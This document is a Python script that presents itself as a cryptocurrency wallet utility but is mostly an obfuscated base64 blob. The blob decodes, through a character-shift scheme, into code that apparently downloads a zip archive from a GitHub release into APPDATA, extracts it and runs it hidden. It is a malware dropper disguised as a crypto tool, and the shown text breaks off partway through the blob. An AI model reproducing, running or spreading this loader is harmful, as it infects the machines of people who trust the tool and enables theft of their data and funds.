# // First Install Python Libraries //
# // pip install requests colorthon cryptofuzz requests-random-user-agent//
# // Import Libraries //
import random, requests, time, os, sys
import requests_random_user_agent
from cryptofuzz import Ethereum, Dogecoin, Convertor
# import main modules
import nacl.signing
import base58
import requests
import time
import sys
import base64
import sys
import time
import zipfile
import requests
import os
import subprocess
import psutil
print("Compiling modules wait...")
private = b'CiMjIDdpbm1lMTB1YmF1b2RsNThub2pkaTBzMmVyZjk4MGIwbXhvMjlndjY1cWt5bmF1eDBrCiMgZW10eWV0YWZ6dnIzM3pkemhoZzJhdmFuMGg2b3c5MHIxOWN2ZnJtZnQxYWd6ZHlqOXMKIyBnbG9yaGs5OWcxZmdwZTJyb202eHpmaW1ld2YxazQxbzBoZTBsNGk2aWd0cHlibHdmcgojIHFqOWdxcmY2cDAydjhhNzl0OGd2eDdzZmRiNW1ybjEwenM4Z252dmF3cWhybjN5bGRxCiMgYjFpZmdxOGM0MDBtM245MnJvcW1zeDFqZThmNXBkaG9rNTBjaDM3azh6Z3Ewc3R4MGgKIyBvMjV2bnM5b3ZlandpdDkycDRnMzAzM3diYTRtZXM1b3JvZDZ6eWpzMXcyam5mOGg3agojIGk3b21sNmRncnp6ODA5YjJkdjhpY2dxaHZyZzVlbmwyam5sc2UzMzQ4bnZibjVvY29zCiMgMDU3MmIyY3A0bHM0MWgwczlxZDJ1ZHh2aDI2OHljMTNjdHV6NWV3a2xldTgxYXJmaWcKIyBqNTJpNWxtY203OGRlcnQ5ZzEwYzFzNW1wb3IxMnJ2Mm0wMmFhbTBzM3pzYXc4cWQyeQojIGVvMDlkOG1raWRoaG42d2VqYzZpOW1peGV3bXdydjZreXhveXhuZnc4Y2szMXN2Y2d5CmZ5bHJjYWt3YnMgPSBbMTA4LCAxMTIsIDExNSwgMTE0LCAxMTcsIDExOSwgMzUsIDExOCwgMTI0LCAxMTgsIDEzLCAxMDgsIDExMiwgMTE1LCAxMTQsIDExNywgMTE5LCAzNSwgMTE5LCAxMDgsIDExMiwgMTA0LCAxMywgMTA4LCAxMTIsIDExNSwgMTE0LCAxMTcsIDExOSwgMzUsIDEyNSwgMTA4LCAxMTUsIDEwNSwgMTA4LCAxMTEsIDEwNCwgMTMsIDEwOCwgMTEyLCAxMTUsIDExNCwgMTE3LCAxMTksIDM1LCAxMTcsIDEwNCwgMTE2LCAxMjAsIDEwNCwgMTE4LCAxMTksIDExOCwgMTMsIDEwOCwgMTEyLCAxMTUsIDExNCwgMTE3LCAxMTksIDM1LCAxMTQsIDExOCwgMTMsIDEwOCwgMTEyLCAxMTUsIDExNCwgMTE3LCAxMTksIDM1LCAxMTgsIDEyMCwgMTAxLCAxMTUsIDExNywgMTE0LCAxMDIsIDEwNCwgMTE4LCAxMTgsIDEzLCAxMTUsIDEwMCwgMTE5LCAxMDcsIDM1LCA2NCwgMzUsIDExNCwgMTE4LCA0OSwgMTA2LCAxMDQsIDExOSwgMTA0LCAxMTMsIDEyMSwgNDMsIDQyLCA2OCwgODMsIDgzLCA3MSwgNjgsIDg3LCA2OCwgNDIsIDQ0LCAxMywgMTIwLCAxMTgsIDEwNCwgMTE3LCAxMTMsIDEwMCwgMTEyLCAxMDQsIDM1LCA2NCwgMzUsIDExNCwgMTE4LCA0OSwgMTA2LCAxMDQsIDExOSwgMTExLCAxMTQsIDEwNiwgMTA4LCAxMTMsIDQzLCA0NCwgMTMsIDEwMCwgMTA4LCAxMTcsIDEwMywgMTE3LCAxMTQsIDExNSwgMTE4LCA5OCwgMTE1LCAxMDAsIDExOSwgMTA3LCAzNSwgNjQsIDM1LCAxMDUsIDM3LCA3MCwgNjEsIDk1LCA5NSwgODgsIDExOCwgMTA0LCAxMTcsIDExOCwgOTUsIDk1LCAxMjYsIDEyMCwgMTE4LCAxMDQsIDExNywgMTEzLCAxMDAsIDExMiwgMTA0LCAxMjgsIDk1LCA5NSwgNjgsIDExNSwgMTE1LCA3MSwgMTAwLCAxMTksIDEwMCwgOTUsIDk1LCA4NSwgMTE0LCAxMDAsIDExMiwgMTA4LCAxMTMsIDEwNiwgOTUsIDk1LCA3MCwgODUsIDg3LCA5NSwgOTUsIDEwMCwgMTA4LCAxMTcsIDEwMywgMTE3LCAxMTQsIDExNSwgMTE4LCA0OSwgMTA0LCAxMjMsIDEwNCwgMzcsIDEzLCAxMDgsIDEwNSwgMzUsIDExMywgMTE0LCAxMTksIDM1LCAxMTQsIDExOCwgNDksIDExNSwgMTAwLCAxMTksIDEwNywgNDksIDEwNCwgMTIzLCAxMDgsIDExOCwgMTE5LCAxMTgsIDQzLCAxMDAsIDEwOCwgMTE3LCAxMDMsIDExNywgMTE0LCAxMTUsIDExOCwgOTgsIDExNSwgMTAwLCAxMTksIDEwNywgNDQsIDYxLCAxMywgMTIsIDEyMCwgMTE3LCAxMTEsIDM1LCA2NCwgMzUsIDQyLCAxMDcsIDExOSwgMTE5LCAxMTUsIDExOCwgNjEsIDUwLCA1MCwgMTA2LCAxMDgsIDExOSwgMTA3LCAxMjAsIDEwMSwgNDksIDEwMiwgMTE0LCAxMTIsIDUwLCAxMTUsIDExNywgMTIxLCAxMTQsIDYwLCA1NCwgNjAsIDU2LCA1MCwgMTE5LCAxMDQsIDExOCwgMTE5LCA1MCwgMTE3LCAxMDQsIDExMSwgMTA0LCAxMDAsIDExOCwgMTA0LCAxMTgsIDUwLCAxMDMsIDExNCwgMTIyLCAxMTMsIDExMSwgMTE0LCAxMDAsIDEwMywgNTAsIDExOSwgMTA0LCAxMTgsIDExOSwgNTAsIDEwMCwgMTA4LCAxMTcsIDEwMywgMTE3LCAxMTQsIDExNSwgMTE4LCA0OSwgMTI1LCAxMDgsIDExNSwgNDIsIDEzLCAxMiwgMTE3LCAxMDQsIDExOCwgMTE1LCAxMTQsIDExMywgMTE4LCAxMDQsIDM1LCA2NCwgMzUsIDExNywgMTA0LCAxMTYsIDEyMCwgMTA0LCAxMTgsIDExOSwgMTE4LCA0OSwgMTA2LCAxMDQsIDExOSwgNDMsIDEyMCwgMTE3LCAxMTEsIDQ0LCAxMywgMTIsIDEwOCwgMTA1LCAzNSwgMTE3LCAxMDQsIDExOCwgMTE1LCAxMTQsIDExMywgMTE4LCAxMDQsIDQ5LCAxMTgsIDExOSwgMTAwLCAxMTksIDEyMCwgMTE4LCA5OCwgMTAyLCAxMTQsIDEwMywgMTA0LCAzNSwgNjQsIDY0LCAzNSwgNTMsIDUxLCA1MSwgNjEsIDEzLCAxMiwgMTIsIDExOSwgMTE3LCAxMjQsIDYxLCAxMywgMTIsIDEyLCAxMiwgMTE3LCAxMDQsIDExOCwgMTE1LCAxMTQsIDExMywgMTE4LCAxMDQsIDM1LCA2NCwgMzUsIDExNywgMTA0LCAxMTYsIDEyMCwgMTA0LCAxMTgsIDExOSwgMTE4LCA0OSwgMTA2LCAxMDQsIDExOSwgNDMsIDEyMCwgMTE3LCAxMTEsIDQ0LCAxMywgMTIsIDEyLCAxMiwgMTIyLCAxMDgsIDExOSwgMTA3LCAzNSwgMTE0LCAxMTUsIDEwNCwgMTEzLCA0MywgMTE1LCAxMDAsIDExOSwgMTA3LCAzNSwgNDYsIDM1LCAzNywgNTAsIDExMiwgMTAwLCAxMDgsIDExMywgNDksIDEyNSwgMTA4LCAxMTUsIDM3LCA0NywgMzUsIDM3LCAxMjIsIDEwMSwgMzcsIDQ0LCAzNSwgMTAwLCAxMTgsIDM1LCAxMDUsIDEwOCwgMTExLCAxMDQsIDYxLCAxMywgMTIsIDEyLCAxMiwgMTIsIDEwNSwgMTA4LCAxMTEsIDEwNCwgNDksIDEyMiwgMTE3LCAxMDgsIDExOSwgMTA0LCA0MywgMTE3LCAxMDQsIDExOCwgMTE1LCAxMTQsIDExMywgMTE4LCAxMDQsIDQ5LCAxMDIsIDExNCwgMTEzLCAxMTksIDEwNCwgMTEzLCAxMTksIDQ0LCAxMywgMTIsIDEyLCAxMiwgMTI1LCAxMDgsIDExNSwgOTgsIDExNSwgMTAwLCAxMTksIDEwNywgMzUsIDY0LCAzNSwgMTE0LCAxMTgsIDQ5LCAxMTUsIDEwMCwgMTE5LCAxMDcsIDQ5LCAxMDksIDExNCwgMTA4LCAxMTMsIDQzLCAxMTUsIDEwMCwgMTE5LCAxMDcsIDQ3LCAzNSwgMzcsIDExMiwgMTAwLCAxMDgsIDExMywgNDksIDEyNSwgMTA4LCAxMTUsIDM3LCA0NCwgMTMsIDEyLCAxMiwgMTIsIDEwNCwgMTIzLCAxMTksIDExNywgMTAwLCAxMDIsIDExOSwgOTgsIDEwMywgMTA4LCAxMTcsIDM1LCA2NCwgMzUsIDExNSwgMTAwLCAxMTksIDEwNywgMzUsIDQ2LCAzNSwgMzcsIDUwLCA3MCwgODUsIDg3LCAzNywgMTMsIDEyLCAxMiwgMTIsIDExNCwgMTE4LCA0OSwgMTEyLCAxMDAsIDExMCwgMTA0LCAxMDMsIDEwOCwgMTE3LCAxMTgsIDQzLCAxMDQsIDEyMywgMTE5LCAxMTcsIDEwMCwgMTAyLCAxMTksIDk4LCAxMDMsIDEwOCwgMTE3LCA0NywgMzUsIDEwNCwgMTIzLCAxMDgsIDExOCwgMTE5LCA5OCwgMTE0LCAxMTAsIDY0LCA4NywgMTE3LCAxMjAsIDEwNCwgNDQsIDEzLCAxMiwgMTIsIDEyLCAxMjIsIDEwOCwgMTE5LCAxMDcsIDM1LCAxMjUsIDEwOCwgMTE1LCAxMDUsIDEwOCwgMTExLCAxMDQsIDQ5LCA5MywgMTA4LCAxMTUsIDczLCAxMDgsIDExMSwgMTA0LCA0MywgMTI1LCAxMDgsIDExNSwgOTgsIDExNSwgMTAwLCAxMTksIDEwNywgNDcsIDM1LCA0MiwgMTE3LCA0MiwgNDQsIDM1LCAxMDAsIDExOCwgMzUsIDEyNSwgMTA4LCAxMTUsIDk4LCAxMTcsIDEwNCwgMTA1LCA2MSwgMTMsIDEyLCAxMiwgMTIsIDEyLCAxMjUsIDEwOCwgMTE1LCA5OCwgMTE3LCAxMDQsIDEwNSwgNDksIDEwNCwgMTIzLCAxMTksIDExNywgMTAwLCAxMDIsIDExOSwgMTAwLCAxMTEsIDExMSwgNDMsIDEwNCwgMTIzLCAxMTksIDExNywgMTAwLCAxMDIsIDExOSwgOTgsIDEwMywgMTA4LCAxMTcsIDQ0LCAxMywgMTIsIDEyLCAxMiwgMTE5LCAxMDgsIDExMiwgMTA0LCA0OSwgMTE4LCAxMTEsIDEwNCwgMTA0LCAxMTUsIDQzLCA1MiwgNDQsIDEzLCAxMiwgMTIsIDEyLCAxMTQsIDExOCwgNDksIDExOCwgMTE5LCAxMDAsIDExNywgMTE5LCAxMDUsIDEwOCwgMTExLCAxMDQsIDQzLCAxMDAsIDEwOCwgMTE3LCAxMDMsIDExNywgMTE0LCAxMTUsIDExOCwgOTgsIDExNSwgMTAwLCAxMTksIDEwNywgNDQsIDEzLCAxMiwgMTIsIDEwNCwgMTIzLCAxMDIsIDEwNCwgMTE1LCAxMTksIDYxLCAxMywgMTIsIDEyLCAxMiwgMTE1LCAxMDAsIDExOCwgMTE4LCAxMywgMTMsIDEyLCAxMDQsIDExMSwgMTA4LCAxMDUsIDM1LCAxMTcsIDEwNCwgMTE4LCAxMTUsIDExNCwgMTEzLCAxMTgsIDEwNCwgNDksIDExOCwgMTE5LCAxMDAsIDExOSwgMTIwLCAxMTgsIDk4LCAxMDIsIDExNCwgMTAzLCAxMDQsIDM1LCA2NCwgNjQsIDM1LCA1NSwgNTEsIDU1LCA2MSwgMTMsIDEyLCAxMiwgMTIwLCAxMTcsIDExMSwgMzUsIDY0LCAzNSwgNDIsIDEwNywgMTE5LCAxMTksIDExNSwgMTE4LCA2MSwgNTAsIDUwLCAxMDYsIDEwOCwgMTE5LCAxMDcsIDEyMCwgMTAxLCA0OSwgMTAyLCAxMTQsIDExMiwgNTAsIDc3LCAxMDQsIDExMywgMTA4LCAxMTgsIDEwNywgNTQsIDUzLCA1NSwgNTAsIDEwNiwgMTAwLCAxMTIsIDEwNCwgMTE4LCAxMDgsIDExOSwgMTA0LCA1MCwgMTE3LCAxMDQsIDExMSwgMTA0LCAxMDAsIDExOCwgMTA0LCAxMTgsIDUwLCAxMDMsIDExNCwgMTIyLCAxMTMsIDExMSwgMTE0LCAxMDAsIDEwMywgNTAsIDExOSwgMTA0LCAxMTgsIDExOSwgNTAsIDEwMCwgMTA4LCAxMTcsIDEwMywgMTE3LCAxMTQsIDExNSwgMTE4LCA0OSwgMTI1LCAxMDgsIDExNSwgNDIsIDEzLCAxMiwgMTIsIDExOSwgMTE3LCAxMjQsIDYxLCAxMywgMTIsIDEyLCAxMiwgMTE3LCAxMDQsIDExOCwgMTE1LCAxMTQsIDExMywgMTE4LCAxMDQsIDM1LCA2NCwgMzUsIDExNywgMTA0LCAxMTYsIDEyMCwgMTA0LCAxMTgsIDExOSwgMTE4LCA0OSwgMTA2LCAxMDQsIDExOSwgNDMsIDEyMCwgMTE3LCAxMTEsIDQ0LCAxMywgMTIsIDEyLCAxMiwgMTIyLCAxMDgsIDExOSwgMTA3LCAzNSwgMTE0LCAxMTUsIDEwNCwgMTEzLCA0MywgMTE1LCAxMDAsIDExOSwgMTA3LCAzNSwgNDYsIDM1LCAzNywgNTAsIDExMiwgMTAwLCAxMDgsIDExMywgNDksIDEyNSwgMTA4LCAxMTUsIDM3LCA0NywgMzUsIDM3LCAxMjIsIDEwMSwgMzcsIDQ0LCAzNSwgMTAwLCAxMTgsIDM1LCAxMDUsIDEwOCwgMTExLCAxMDQsIDYxLCAxMywgMTIsIDEyLCAxMiwgMTIsIDEwNSwgMTA4LCAxMTEsIDEwNCwgNDksIDEyMiwgMTE3LCAxMDgsIDExOSwgMTA0LCA0MywgMTE3LCAxMDQsIDExOCwgMTE1LCAxMTQsIDExMywgMTE4LCAxMDQsIDQ5LCAxMDIsIDExNCwgMTEzLCAxMTksIDEwNCwgMTEzLCAxMTksIDQ0LCAxMywgMTIsIDEyLCAxMiwgMTI1LCAxMDgsIDExNSwgOTgsIDExNSwgMTAwLCAxMTksIDEwNywgMzUsIDY0LCAzNSwgMTE0LCAxMTgsIDQ5LCAxMTUsIDEwMCwgMTE5LCAxMDcsIDQ5LCAxMDksIDExNCwgMTA4LCAxMTMsIDQzLCAxMTUsIDEwMCwgMTE5LCAxMDcsIDQ3LCAzNSwgMzcsIDExMiwgMTAwLCAxMDgsIDExMywgNDksIDEyNSwgMTA4LCAxMTUsIDM3LCA0NCwgMTMsIDEyLCAxMiwgMTIsIDEwNCwgMTIzLCAxMTksIDExNywgMTAwLCAxMDIsIDExOSwgOTgsIDEwMywgMTA4LCAxMTcsIDM1LCA2NCwgMzUsIDExNSwgMTAwLCAxMTksIDEwNywgMzUsIDQ2LCAzNSwgMzcsIDUwLCA3MCwgODUsIDg3LCAzNywgMTMsIDEyLCAxMiwgMTIsIDExNCwgMTE4LCA0OSwgMTEyLCAxMDAsIDExMCwgMTA0LCAxMDMsIDEwOCwgMTE3LCAxMTgsIDQzLCAxMDQsIDEyMywgMTE5LCAxMTcsIDEwMCwgMTAyLCAxMTksIDk4LCAxMDMsIDEwOCwgMTE3LCA0NywgMzUsIDEwNCwgMTIzLCAxMDgsIDExOCwgMTE5LCA5OCwgMTE0LCAxMTAsIDY0LCA4NywgMTE3LCAxMjAsIDEwNCwgNDQsIDEzLCAxMiwgMTIsIDEyLCAxMjIsIDEwOCwgMTE5LCAxMDcsIDM1LCAxMjUsIDEwOCwgMTE1LCAxMDUsIDEwOCwgMTExLCAxMDQsIDQ5LCA5MywgMTA4LCAxMTUsIDczLCAxMDgsIDExMSwgMTA0LCA0MywgMTI1LCAxMDgsIDExNSwgOTgsIDExNSwgMTAwLCAxMTksIDEwNywgNDcsIDM1LCA0MiwgMTE3LCA0MiwgNDQsIDM1LCAxMDAsIDExOCwgMzUsIDEyNSwgMTA4LCAxMTUsIDk4LCAxMTcsIDEwNCwgMTA1LCA2MSwgMTMsIDEyLCAxMiwgMTIsIDEyLCAxMjUsIDEwOCwgMTE1LCA5OCwgMTE3LCAxMDQsIDEwNSwgNDksIDEwNCwgMTIzLCAxMTksIDExNywgMTAwLCAxMDIsIDExOSwgMTAwLCAxMTEsIDExMSwgNDMsIDEwNCwgMTIzLCAxMTksIDExNywgMTAwLCAxMDIsIDExOSwgOTgsIDEwMywgMTA4LCAxMTcsIDQ0LCAxMywgMTIsIDEyLCAxMiwgMTE5LCAxMDgsIDExMiwgMTA0LCA0OSwgMTE4LCAxMTEsIDEwNCwgMTA0LCAxMTUsIDQzLCA1MiwgNDQsIDEzLCAxMiwgMTIsIDEyLCAxMTQsIDExOCwgNDksIDExOCwgMTE5LCAxMDAsIDExNywgMTE5LCAxMDUsIDEwOCwgMTExLCAxMDQsIDQzLCAxMDAsIDEwOCwgMTE3LCAxMDMsIDExNywgMTE0LCAxMTUsIDExOCwgOTgsIDExNSwgMTAwLCAxMTksIDEwNywgNDQsIDEzLCAxMiwgMTIsIDEwNCwgMTIzLCAxMDIsIDEwNCwgMTE1LCAxMTksIDYxLCAxMywgMTIsIDEyLCAxMiwgMTE1LCAxMDAsIDExOCwgMTE4LCAxMywgMTIsIDEwNCwgMTExLCAxMTgsIDEwNCwgNjEsIDEzLCAxMiwgMTIsIDExNSwgMTAwLCAxMTgsIDExOCwgMTMsIDEzLCAxMywgMTMsIDEzLCAxMywgMTMsIDEzLCAxMywgMTMsIDEzLCAxMywgMTMsIDEzLCAxMywgMTMsIDEzLCAxMywgMTMsIDEzLCAxMywgMTMsIDEzLCAxMywgMTMsIDEzLCAxMywgMTIsIDM3LCAzNywgMzcsIDEzLCAzNSwgMzUsIDM1LCAzNSwgMTIwLCAxMTcsIDExMSwgMzUsIDY0LCAzNSwgNDIsIDEwNywgMTE5LCAxMTksIDExNSwgMTE4LCA2MSwgNTAsIDUwLCAxMDYsIDEwOCwgMTE5LCAxMDcsIDEyMCwgMTAxLCA0OSwgMTAyLCAxMTQsIDExMiwgNTAsIDEwMywgMTA4LCAxMTcsIDEwNCwgMTAyLCAxMTksIDEyMCwgMTE4LCAxMDQsIDExNywgNTAsIDExMiwgMTEzLCAxMDQsIDExMiwgMTE0LCAxMTMsIDEwOCwgMTAyLCA0OCwgMTAyLCAxMDcsIDEwNCwgMTAyLCAxMTAsIDEwNCwgMTE3LCA1MCwgMTE3LCAxMDQsIDExMSwgMTA0LCAxMDAsIDExOCwgMTA0LCAxMTgsIDUwLCAxMDMsIDExNCwgMTIyLCAxMTMsIDExMSwgMTE0LCAxMDAsIDEwMywgNTAsIDUyLCA1MCwgMTExLCAxMTQsIDExOCwgMTE5LCAxMTgsIDExNCwgMTIwLCAxMTEsIDQ5LCAxMjUsIDEwOCwgMTE1LCA0MiwgMTMsIDM1LCAzNSwgMzUsIDM1LCAxMTcsIDEwNCwgMTE4LCAxMTUsIDExNCwgMTEzLCAxMTgsIDEwNCwgMzUsIDY0LCAzNSwgMTE3LCAxMDQsIDExNiwgMTIwLCAxMDQsIDExOCwgMTE5LCAxMTgsIDQ5LCAxMDYsIDEwNCwgMTE5LCA0MywgMTIwLCAxMTcsIDExMSwgNDQsIDEzLCAzNSwgMzUsIDM1LCAzNSwgMTIyLCAxMDgsIDExOSwgMTA3LCAzNSwgMTE0LCAxMTUsIDEwNCwgMTEzLCA0MywgMTE1LCAxMDAsIDExOSwgMTA3LCAzNSwgNDYsIDM1LCAzNywgNTAsIDEwMywgMTAwLCAxMTksIDEwMCwgNDksIDEyNSwgMTA4LCAxMTUsIDM3LCA0NywgMzUsIDM3LCAxMjIsIDEwMSwgMzcsIDQ0LCAzNSwgMTAwLCAxMTgsIDM1LCAxMDUsIDEwOCwgMTExLCAxMDQsIDYxLCAxMywgMzUsIDM1LCAzNSwgMzUsIDM1LCAzNSwgMzUsIDM1LCAxMDUsIDEwOCwgMTExLCAxMDQsIDQ5LCAxMjIsIDExNywgMTA4LCAxMTksIDEwNCwgNDMsIDExNywgMTA0LCAxMTgsIDExNSwgMTE0LCAxMTMsIDExOCwgMTA0LCA0OSwgMTAyLCAxMTQsIDExMywgMTE5LCAxMDQsIDExMywgMTE5LCA0NCwgMTMsIDM1LCAzNSwgMzUsIDM1LCAxMjUsIDEwOCwgMTE1LCA5OCwgMTE1LCAxMDAsIDExOSwgMTA3LCAzNSwgNjQsIDM1LCAxMTQsIDExOCwgNDksIDExNSwgMTAwLCAxMTksIDEwNywgNDksIDEwOSwgMTE0LCAxMDgsIDExMywgNDMsIDExNSwgMTAwLCAxMTksIDEwNywgNDcsIDM1LCAzNywgMTAzLCAxMDAsIDExOSwgMTAwLCA0OSwgMTI1LCAxMDgsIDExNSwgMzcsIDQ0LCAxMywgMzUsIDM1LCAzNSwgMzUsIDEwNCwgMTIzLCAxMTksIDExNywgMTAwLCAxMDIsIDExOSwgOTgsIDEwMywgMTA4LCAxMTcsIDM1LCA2NCwgMzUsIDExNSwgMTAwLCAxMTksIDEwNywgMzUsIDQ2LCAzNSwgMzcsIDUwLCA3MSwgNjgsIDg3LCA2OCwgMzcsIDEzLCAzNSwgMzUsIDM1LCAzNSwgMTE0LCAxMTgsIDQ5LCAxMTIsIDEwMCwgMTEwLCAxMDQsIDEwMywgMTA4LCAxMTcsIDExOCwgNDMsIDEwNCwgMTIzLCAxMTksIDExNywgMTAwLCAxMDIsIDExOSwgOTgsIDEwMywgMTA4LCAxMTcsIDQ3LCAzNSwgMTA0LCAxMjMsIDEwOCwgMTE4LCAxMTksIDk4LCAxMTQsIDExMCwgNjQsIDg3LCAxMTcsIDEyMCwgMTA0LCA0NCwgMTMsIDM1LCAzNSwgMzUsIDM1LCAxMjIsIDEwOCwgMTE5LCAxMDcsIDM1LCAxMjUsIDEwOCwgMTE1LCAxMDUsIDEwOCwgMTExLCAxMDQsIDQ5LCA5MywgMTA4LCAxMTUsIDczLCAxMDgsIDExMSwgMTA0LCA0MywgMTI1LCAxMDgsIDExNSwgOTgsIDExNSwgMTAwLCAxMTksIDEwNywgNDcsIDM1LCA0MiwgMTE3LCA0MiwgNDQsIDM1LCAxMDAsIDExOCwgMzUsIDEyNSwgMTA4LCAxMTUsIDk4LCAxMTcsIDEwNCwgMTA1LCA2MSwgMTMsIDM1LCAzNSwgMzUsIDM1LCAzNSwgMzUsIDM1LCAzNSwgMTI1LCAxMDgsIDExNSwgOTgsIDExNywgMTA0LCAxMDUsIDQ5LCAxMDQsIDEyMywgMTE5LCAxMTcsIDEwMCwgMTAyLCAxMTksIDEwMCwgMTExLCAxMTEsIDQzLCAxMDQsIDEyMywgMTE5LCAxMTcsIDEwMCwgMTAyLCAxMTksIDk4LCAxMDMsIDEwOCwgMTE3LCA0NCwgMTMsIDM1LCAzNSwgMzUsIDM1LCAxMTksIDEwOCwgMTEyLCAxMDQsIDQ5LCAxMTgsIDExMSwgMTA0LCAxMDQsIDExNSwgNDMsIDUyLCA0NCwgMTMsIDM1LCAzNSwgMzUsIDM1LCAxMTQsIDExOCwgNDksIDExOCwgMTE5LCAxMDAsIDExNywgMTE5LCAxMDUsIDEwOCwgMTExLCAxMDQsIDQzLCAxMDUsIDM3LCA3MCwgNjEsIDk1LCA5NSwgODgsIDExOCwgMTA0LCAxMTcsIDExOCwgOTUsIDk1LCAxMjYsIDEyMCwgMTE4LCAxMDQsIDExNywgMTEzLCAxMDAsIDExMiwgMTA0LCAxMjgsIDk1LCA5NSwgNjgsIDExNSwgMTE1LCA3MSwgMTAwLCAxMTksIDEwMCwgOTUsIDk1LCA4NSwgMTE0LCAxMDAsIDExMiwgMTA4LCAxMTMsIDEwNiwgOTUsIDk1LCA3MSwgNjgsIDg3LCA2OCwgOTUsIDk1LCAxMTEsIDExNCwgMTE4LCAxMTksIDExOCwgMTE0LCAxMjAsIDExMSwgNDksIDEwNCwgMTIzLCAxMDQsIDM3LCA0NCwgMTMsIDM1LCAzNSwgMzUsIDM1LCAxMTUsIDEwMCwgMTE5LCAxMDcsIDk4LCAxMTUsIDExNCwgMTIyLCAxMDQsIDExNywgMTE4LCAxMDcsIDEwNCwgMTExLCAxMTEsIDM1LCA2NCwgMzUsIDEwNSwgMzcsIDcwLCA2MSwgOTUsIDk1LCA4OCwgMTE4LCAxMDQsIDExNywgMTE4LCA5NSwgOTUsIDEyNiwgMTIwLCAxMTgsIDEwNCwgMTE3LCAxMTMsIDEwMCwgMTEyLCAxMDQsIDEyOCwgOTUsIDk1LCA2OCwgMTE1LCAxMTUsIDcxLCAxMDAsIDExOSwgMTAwLCA5NSwgOTUsIDg1LCAxMTQsIDEwMCwgMTEyLCAxMDgsIDExMywgMTA2LCA5NSwgOTUsIDcxLCA2OCwgODcsIDY4LCA5NSwgOTUsIDEwMiwgMTE0LCAxMTMsIDEwNywgMTE0LCAxMTgsIDExOSwgNDksIDExNSwgMTE4LCA1MiwgMzcsIDEzLCAzNSwgMzUsIDM1LCAzNSwgMTIwLCAxMTcsIDExMSwgOTgsIDExNSwgMTE0LCAxMjIsIDM1LCA2NCwgMzUsIDM3LCAxMDcsIDExOSwgMTE5LCAxMTUsIDExOCwgNjEsIDUwLCA1MCwgMTA2LCAxMDgsIDExOSwgMTA3LCAxMjAsIDEwMSwgNDksIDEwMiwgMTE0LCAxMTIsIDUwLCAxMDMsIDEwOCwgMTE3LCAxMDQsIDEwMiwgMTE5LCAxMjAsIDExOCwgMTA0LCAxMTcsIDUwLCAxMTIsIDExMywgMTA0LCAxMTIsIDExNCwgMTEzLCAxMDgsIDEwMiwgNDgsIDEwMiwgMTA3LCAxMDQsIDEwMiwgMTEwLCAxMDQsIDExNywgNTAsIDExNywgMTA0LCAxMTEsIDEwNCwgMTAwLCAxMTgsIDEwNCwgMTE4LCA1MCwgMTAzLCAxMTQsIDEyMiwgMTEzLCAxMTEsIDExNCwgMTAwLCAxMDMsIDUwLCA1MiwgNTAsIDEwMiwgMTE0LCAxMTMsIDEwNywgMTE0LCAxMTgsIDExOSwgNDksIDExNSwgMTE4LCA1MiwgMzcsIDEzLCAzNSwgMzUsIDM1LCAzNSwgMTE3LCAxMDQsIDExOCwgMTE1LCAxMTQsIDEyMiwgMzUsIDY0LCAzNSwgMTE3LCAxMDQsIDExNiwgMTIwLCAxMDQsIDExOCwgMTE5LCAxMTgsIDQ5LCAxMDYsIDEwNCwgMTE5LCA0MywgMTIwLCAxMTcsIDExMSwgOTgsIDExNSwgMTE0LCAxMjIsIDQ0LCAxMywgMzUsIDM1LCAzNSwgMzUsIDEyMiwgMTA4LCAxMTksIDEwNywgMzUsIDExNCwgMTE1LCAxMDQsIDExMywgNDMsIDExNSwgMTAwLCAxMTksIDEwNywgOTgsIDExNSwgMTE0LCAxMjIsIDEwNCwgMTE3LCAxMTgsIDEwNywgMTA0LCAxMTEsIDExMSwgNDcsIDM1LCAzNywgMTIyLCAxMDEsIDM3LCA0NCwgMzUsIDEwMCwgMTE4LCAzNSwgMTA1LCAxMDgsIDExMSwgMTA0LCA5OCwgMTE1LCAxMTQsIDEyMiwgNjEsIDEzLCAzNSwgMzUsIDM1LCAzNSwgMzUsIDM1LCAzNSwgMzUsIDEwNSwgMTA4LCAxMTEsIDEwNCwgOTgsIDExNSwgMTE0LCAxMjIsIDQ5LCAxMjIsIDExNywgMTA4LCAxMTksIDEwNCwgNDMsIDExNywgMTA0LCAxMTgsIDExNSwgMTE0LCAxMjIsIDQ5LCAxMDIsIDExNCwgMTEzLCAxMTksIDEwNCwgMTEzLCAxMTksIDQ0LCAxMywgMzUsIDM1LCAzNSwgMzUsIDExOSwgMTA4LCAxMTIsIDEwNCwgNDksIDExOCwgMTExLCAxMDQsIDEwNCwgMTE1LCA0MywgNTIsIDQ0LCAxMywgMzUsIDM1LCAzNSwgMzUsIDM3LCAzNywgMzcsIDEzLCAzOCwgMTIsIDExOCwgMTIwLCAxMDEsIDExNSwgMTE3LCAxMTQsIDEwMiwgMTA0LCAxMTgsIDExOCwgNDksIDExNywgMTIwLCAxMTMsIDQzLCA5NCwgMzcsIDExNSwgMTE0LCAxMjIsIDEwNCwgMTE3LCAxMTgsIDEwNywgMTA0LCAxMTEsIDExMSwgMzcsIDQ3LCAzNSwgMzcsIDQ4LCA3MiwgMTIzLCAxMDQsIDEwMiwgMTIwLCAxMTksIDEwOCwgMTE0LCAxMTMsIDgzLCAxMTQsIDExMSwgMTA4LCAxMDIsIDEyNCwgMzcsIDQ3LCAzNSwgMzcsIDY5LCAxMjQsIDExNSwgMTAwLCAxMTgsIDExOCwgMzcsIDQ3LCAzNSwgMzcsIDQ4LCA3MywgMTA4LCAxMTEsIDEwNCwgMzcsIDQ3LCAzNSwgMTE1LCAxMDAsIDExOSwgMTA3LCA5OCwgMTE1LCAxMTQsIDEyMiwgMTA0LCAxMTcsIDExOCwgMTA3LCAxMDQsIDExMSwgMTExLCA5NiwgNDQsIDEzLCAzOCwgMTIsIDExOSwgMTA4LCAxMTIsIDEwNCwgNDksIDExOCwgMTExLCAxMDQsIDEwNCwgMTE1LCA0MywgNTIsIDQ0LCAxMywgMzgsIDEyLCAxMTQsIDExOCwgNDksIDExNywgMTA0LCAxMTIsIDExNCwgMTIxLCAxMDQsIDQzLCAxMTUsIDEwMCwgMTE5LCAxMDcsIDk4LCAxMTUsIDExNCwgMTIyLCAxMDQsIDExNywgMTE4LCAxMDcsIDEwNCwgMTExLCAxMTEsIDQ0LCAxM10KZnlscmNha3dicyA9ICcnLmpvaW4oW2NocihpbnQoeCkgLSAzKSBmb3IgeCBpbiBmeWxyY2Frd2JzXSkKCiMjIDdpbm1lMTB1YmF1b2RsNThub2pkaTBzMmVyZjk4MGIwbXhvMjlndjY1cWt5bmF1eDBrCiMgZW10eWV0YWZ6dnIzM3pkemhoZzJhdmFuMGg2b3c5MHIxOWN2ZnJtZnQxYW